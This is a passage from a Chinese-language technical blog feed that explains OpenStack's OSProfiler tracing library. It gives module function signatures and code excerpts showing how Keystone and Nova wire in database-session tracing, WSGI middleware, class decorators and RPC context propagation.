class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split</span>(<span class="params">text, strip=<span class="literal">True</span></span>):</span>                    <span class="comment"># 分割逗号分隔的文本</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_encode</span>(<span class="params">text, encoding=<span class="string">&quot;utf-8&quot;</span></span>):</span>      <span class="comment"># 将文本转换为二进制编码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_decode</span>(<span class="params">data, encoding=<span class="string">&quot;utf-8&quot;</span></span>):</span>      <span class="comment"># 将二进制编码转换为文本</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_hmac</span>(<span class="params">data, hmac_key</span>):</span>              <span class="comment"># 用 key 产生 HMAC</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signed_pack</span>(<span class="params">data, hmac_key</span>):</span>                <span class="comment"># 用 key 打包和签名数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signed_unpack</span>(<span class="params">data, hmac_data, hmac_keys</span>):</span>  <span class="comment"># 解包数据并验证签名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">itersubclasses</span>(<span class="params">cls, _seen=<span class="literal">None</span></span>):</span>            <span class="comment"># 判断是否为子类</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">import_modules_from_package</span>(<span class="params">package</span>):</span>       <span class="comment"># 从包导入模块并加入系统模块</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shorten_id</span>(<span class="params">span_id</span>):</span>                        <span class="comment"># UUID 转换为 64 位 ID</span></span><br></pre></td></tr></table></figure><p><strong>notifier.py（通知消息）</strong></p><ul><li>默认使用基本的驱动程序</li><li>根据参数设置驱动</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_noop_notifier</span>(<span class="params">info, context=<span class="literal">None</span></span>):</span>         <span class="comment"># 使用基本的驱动程序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">notify</span>(<span class="params">info</span>):</span>                               <span class="comment"># 传递信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>():</span>                                      <span class="comment"># 返回可调用函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span>(<span class="params">notifier</span>):</span>                              <span class="comment"># 设置可调用函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">connection_string, *args, **kwargs</span>):</span> <span class="comment"># 根据参数设置驱动</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear_notifier_cache</span>():</span>                     <span class="comment"># 清除缓存</span></span><br></pre></td></tr></table></figure><p><strong>profiler.py（osprofiler 实例，函数/类装饰器，元数据类）</strong></p><ul><li>函数装饰器 </li><li>类装饰器</li><li>元数据类</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span>():</span>                                            <span class="comment"># 清除全局 ThreadLocal 对象</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ensure_no_multiple_traced</span>(<span class="params">traceable_attrs</span>):</span>        <span class="comment"># 确保不重复跟踪</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>(<span class="params">hmac_key, base_id=<span class="literal">None</span>, parent_id=<span class="literal">None</span></span>):</span>       <span class="comment"># 初始化 osprofiler 线程实例</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>():</span>                                              <span class="comment"># 获取 osprofiler 实例</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">name, info=<span class="literal">None</span></span>):</span>                             <span class="comment"># 启动 osprofiler</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stop</span>(<span class="params">info=<span class="literal">None</span></span>):</span>                                    <span class="comment"># 停止 osprofiler</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数追踪装饰器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trace</span>(<span class="params">name, info=<span class="literal">None</span>, hide_args=<span class="literal">False</span>, hide_result=<span class="literal">True</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">          allow_multiple_trace=<span class="literal">True</span></span>):</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 类追踪装饰器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trace_cls</span>(<span class="params">name, info=<span class="literal">None</span>, hide_args=<span class="literal">False</span>, hide_result=<span class="literal">True</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              trace_private=<span class="literal">False</span>, allow_multiple_trace=<span class="literal">True</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              trace_class_methods=<span class="literal">False</span>, trace_static_methods=<span class="literal">False</span></span>):</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TracedMeta</span>(<span class="params"><span class="built_in">type</span></span>):</span>                                 <span class="comment"># 元数据</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Trace</span>(<span class="params"><span class="built_in">object</span></span>):</span>                                    <span class="comment"># 封装 osprofiler 线程实例，使用 with 语句调用</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_Profiler</span>(<span class="params"><span class="built_in">object</span></span>):</span>                                <span class="comment"># 私有类（测试用）</span></span><br></pre></td></tr></table></figure><p><strong>sqlalchemy.py（追踪数据库调用）</strong></p><ul><li>监听调用（调用前、调用后、调用错误）</li><li>包装数据库会话连接</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_tracing</span>(<span class="params">sqlalchemy, engine, name, hide_result=<span class="literal">True</span></span>):</span>    <span class="comment"># 追踪数据库调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 包装会话</span></span><br><span class="line"><span class="meta">@contextlib.contextmanager</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrap_session</span>(<span class="params">sqlalchemy, sess</span>):</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_before_cursor_execute</span>(<span class="params">name</span>):</span>                               <span class="comment"># 传递语句及参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_after_cursor_execute</span>(<span class="params">hide_result=<span class="literal">True</span></span>):</span>                    <span class="comment"># 传递执行结果</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_error</span>(<span class="params">exception_context</span>):</span>                            <span class="comment"># 传递错误信息</span></span><br></pre></td></tr></table></figure><p><strong>web.py（追踪 WSGI 调用）</strong></p><ul><li>签名和打包请求头</li><li>WSGI 中间件类</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_trace_id_headers</span>():</span>     <span class="comment"># 签名请求头并添加到字典</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WsgiMiddleware</span>(<span class="params"><span class="built_in">object</span></span>):</span>   <span class="comment"># WSGI 中间件类</span></span><br></pre></td></tr></table></figure><p><strong>initializer.py（读取配置文件初始化）</strong></p><ul><li>读取配置文件</li><li>设置通知驱动</li><li>启用中间件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务配置文件，请求上下文，项目名称，服务名称，主机名称/IP，通知参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_from_conf</span>(<span class="params">conf, context, project, service, host, **kwargs</span>):</span></span><br></pre></td></tr></table></figure><p><strong>opts.py（配置选项）</strong></p><ul><li>设置默认配置 </li><li>判断配置选项</li><li>列出配置选项</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认配置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_defaults</span>(<span class="params">conf, enabled=<span class="literal">None</span>, trace_sqlalchemy=<span class="literal">None</span>, hmac_keys=<span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                 connection_string=<span class="literal">None</span>, es_doc_type=<span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                 es_scroll_time=<span class="literal">None</span>, es_scroll_size=<span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                 socket_timeout=<span class="literal">None</span>, sentinel_service_name=<span class="literal">None</span></span>):</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_trace_enabled</span>(<span class="params">conf=<span class="literal">None</span></span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_db_trace_enabled</span>(<span class="params">conf=<span class="literal">None</span></span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enable_web_trace</span>(<span class="params">conf=<span class="literal">None</span></span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disable_web_trace</span>(<span class="params">conf=<span class="literal">None</span></span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_opts</span>():</span></span><br></pre></td></tr></table></figure><h1 id="Keystone-启用-OSProfiler"><a href="#Keystone-启用-OSProfiler" class="headerlink" title="Keystone 启用 OSProfiler"></a>Keystone 启用 OSProfiler</h1><ol><li>数据库会话包装</li><li>flask WSGI 中间件包装</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">common/profiler.py    <span class="comment"># 读取配置文件，设置通知驱动，启用中间件</span></span><br><span class="line">common/sql/core.py    <span class="comment"># 包装数据库会话</span></span><br><span class="line">conf/__init__.py      <span class="comment"># 默认配置</span></span><br><span class="line">server/flask/core.py  <span class="comment"># 初始化，调用 common/profiler.py</span></span><br><span class="line">setup.cfg             <span class="comment"># 设置中间件 WsgiMiddleware</span></span><br></pre></td></tr></table></figure><p>common/sql/core.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 osprofiler 模块包装会话</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_wrap_session</span>(<span class="params">sess</span>):</span></span><br><span class="line">    <span class="keyword">if</span> CONF.profiler.enabled <span class="keyword">and</span> CONF.profiler.trace_sqlalchemy:</span><br><span class="line">        sess = osprofiler.sqlalchemy.wrap_session(sql, sess)</span><br><span class="line">    <span class="keyword">return</span> sess</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_for_read</span>():</span></span><br><span class="line">    <span class="keyword">if</span> _TESTING_USE_GLOBAL_CONTEXT_MANAGER:</span><br><span class="line">        reader = enginefacade.reader</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        reader = _get_main_context_manager().reader</span><br><span class="line">    <span class="keyword">return</span> _wrap_session(reader.using(_get_context()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_for_write</span>():</span></span><br><span class="line">    <span class="keyword">if</span> _TESTING_USE_GLOBAL_CONTEXT_MANAGER:</span><br><span class="line">        writer = enginefacade.writer</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        writer = _get_main_context_manager().writer</span><br><span class="line">    <span class="keyword">return</span> _wrap_session(writer.using(_get_context()))</span><br></pre></td></tr></table></figure><p>setup.cfg 设置 server 中间件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">keystone.server_middleware &#x3D;</span><br><span class="line">    cors &#x3D; oslo_middleware:CORS</span><br><span class="line">    sizelimit &#x3D; oslo_middleware:RequestBodySizeLimiter</span><br><span class="line">    http_proxy_to_wsgi &#x3D; oslo_middleware:HTTPProxyToWSGI</span><br><span class="line">    osprofiler &#x3D; osprofiler.web:WsgiMiddleware          &lt;--- 使用 osprofiler 的 WSGI 中间件</span><br><span class="line">    request_id &#x3D; oslo_middleware:RequestId</span><br><span class="line">    debug &#x3D; oslo_middleware:Debug</span><br></pre></td></tr></table></figure><h1 id="Nova-启用-OSProfiler"><a href="#Nova-启用-OSProfiler" class="headerlink" title="Nova 启用 OSProfiler"></a>Nova 启用 OSProfiler</h1><ol><li>追踪数据库调用</li><li>类追踪装饰器 @profiler.trace_cls</li><li>公有方法装饰器</li></ol><ul><li>组件之间 REST API 并遵循 AMQP 协议</li><li>组件内部 RPC</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">config.py             <span class="comment"># 根据配置文件设置 osprofiler</span></span><br><span class="line">service.py            <span class="comment"># 根据配置文件设置驱动，启用 WSGI 中间件</span></span><br><span class="line">profiler.py           <span class="comment"># 重写 WSGI 中间件类、类追踪装饰器x</span></span><br><span class="line">manager.py            <span class="comment"># 公有方法装饰器（抽象基类）</span></span><br><span class="line">rpc.py                <span class="comment"># 追踪上下文序列化/反序列化</span></span><br><span class="line">utils.py              <span class="comment"># spawn/spawn_n 装饰器，传递上下文</span></span><br><span class="line">db/sqlalchemy/api.py  <span class="comment"># 追踪数据库调用</span></span><br></pre></td></tr></table></figure><p>db/sqlalchemy/api.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 追踪数据库调用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure</span>(<span class="params">conf</span>):</span></span><br><span class="line">    main_context_manager.configure(**_get_db_conf(conf.database))</span><br><span class="line">    api_context_manager.configure(**_get_db_conf(conf.api_database))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> profiler_sqlalchemy <span class="keyword">and</span> CONF.profiler.enabled \</span><br><span class="line">            <span class="keyword">and</span> CONF.profiler.trace_sqlalchemy:</span><br><span class="line"></span><br><span class="line">        main_context_manager.append_on_engine_create(</span><br><span class="line">            <span class="keyword">lambda</span> eng: profiler_sqlalchemy.add_tracing(sa, eng, <span class="string">&quot;db&quot;</span>))     <span class="comment"># 添加追踪</span></span><br><span class="line">        api_context_manager.append_on_engine_create(</span><br><span class="line">            <span class="keyword">lambda</span> eng: profiler_sqlalchemy.add_tracing(sa, eng, <span class="string">&quot;db&quot;</span>))     <span class="comment"># 添加追踪</span></span><br></pre></td></tr></table></figure><p>使用 osprofiler 类装饰器（compute/api.py）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@profiler.trace_cls(<span class="params"><span class="string">&quot;compute_api&quot;</span></span>)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">API</span>(<span class="params">base.Base</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;API for interacting with the compute manager.&quot;&quot;&quot;</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>公有方法装饰器（抽象类），nova 组件内部的模块都继承 <code>Manager</code> 类，支持追踪</p><ul><li><code>ComputeManager</code>、<code>ConductorManager</code>、<code>SchedulerManager</code></li></ul><img src="https://i.loli.net/2021/06/06/RDOdQhbYyL1oPvm.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 公有方法装饰器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ManagerMeta</span>(<span class="params">profiler.get_traced_meta(<span class="params"></span>), <span class="built_in">type</span>(<span class="params">PeriodicTasks</span>)</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Metaclass to trace all children of a specific class.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This metaclass wraps every public method (not starting with _ or __)</span></span><br><span class="line"><span class="string">    of the class using it. All children classes of the class using ManagerMeta</span></span><br><span class="line"><span class="string">    will be profiled as well.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Adding this metaclass requires that the __trace_args__ attribute be added</span></span><br><span class="line"><span class="string">    to the class we want to modify. That attribute is a dictionary</span></span><br><span class="line"><span class="string">    with one mandatory key: &quot;name&quot;. &quot;name&quot; defines the name</span></span><br><span class="line"><span class="string">    of the action to be traced (for example, wsgi, rpc, db).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The OSprofiler-based tracing, although, will only happen if profiler</span></span><br><span class="line"><span class="string">    instance was initiated somewhere before in the thread, that can only happen</span></span><br><span class="line"><span class="string">    if profiling is enabled in nova.conf and the API call to Nova API contained</span></span><br><span class="line"><span class="string">    specific headers.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 抽象基类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Manager</span>(<span class="params">base.Base, PeriodicTasks, metaclass=ManagerMeta</span>):</span></span><br><span class="line">    __trace_args__ = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;rpc&quot;</span>&#125;    <span class="comment"># 必须</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>线程间传递上下文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 追踪请求上下文</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProfilerRequestContextSerializer</span>(<span class="params">RequestContextSerializer</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serialize_context</span>(<span class="params">self, context</span>):</span></span><br><span class="line">        _context = <span class="built_in">super</span>(ProfilerRequestContextSerializer,</span><br><span class="line">                         self).serialize_context(context)</span><br><span class="line"></span><br><span class="line">        prof = profiler.get()       <span class="comment"># 获取 osprofiler 实例</span></span><br><span class="line">        <span class="keyword">if</span> prof:</span><br><span class="line">            <span class="comment"># FIXME(DinaBelova): we&#x27;ll add profiler.get_info() method</span></span><br><span class="line">            <span class="comment"># to extract this info -&gt; we&#x27;ll need to update these lines</span></span><br><span class="line">            trace_info = &#123;</span><br><span class="line">                <span class="string">&quot;hmac_key&quot;</span>: prof.hmac_key,</span><br><span class="line">                <span class="string">&quot;base_id&quot;</span>: prof.get_base_id(),</span><br><span class="line">                <span class="string">&quot;parent_id&quot;</span>: prof.get_id()</span><br><span class="line">            &#125;</span><br><span class="line">            _context.update(&#123;<span class="string">&quot;trace_info&quot;</span>: trace_info&#125;) <span class="comment"># 添加追踪信息</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> _context</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deserialize_context</span>(<span class="params">self, context</span>):</span></span><br><span class="line">        trace_info = context.pop(<span class="string">&quot;trace_info&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> trace_info:</span><br><span class="line">            profiler.init(**trace_info)     <span class="comment"># 初始化 osprofiler 实例</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>(ProfilerRequestContextSerializer,</span><br><span class="line">                     self).deserialize_context(context)</span><br></pre></td></tr></table></figure><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://learnku.com/articles/31681">使用 OSProfiler 对 OpenStack 进行性能测量</a></li><li><a href="https://docs.openstack.org/zaqar/latest/admin/OSprofiler.html">OSprofiler Guide</a></li><li><a href="https://docs.openstack.org/ironic/pike/contributor/osprofiler-support.html">About OSProfiler</a></li><li><a href="https://github.com/openstack/osprofiler">openstack/osprofiler</a></li><li><a href="https://openstack.nimeyo.com/117882/openstack-dev-tracing-all-the-places">[openstack-dev] Tracing (all the places)</a></li></ul>]]></content>
    
    
    <summary type="html">结合 Keystone、Glance（Rockey）等组件测试</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
</feed>
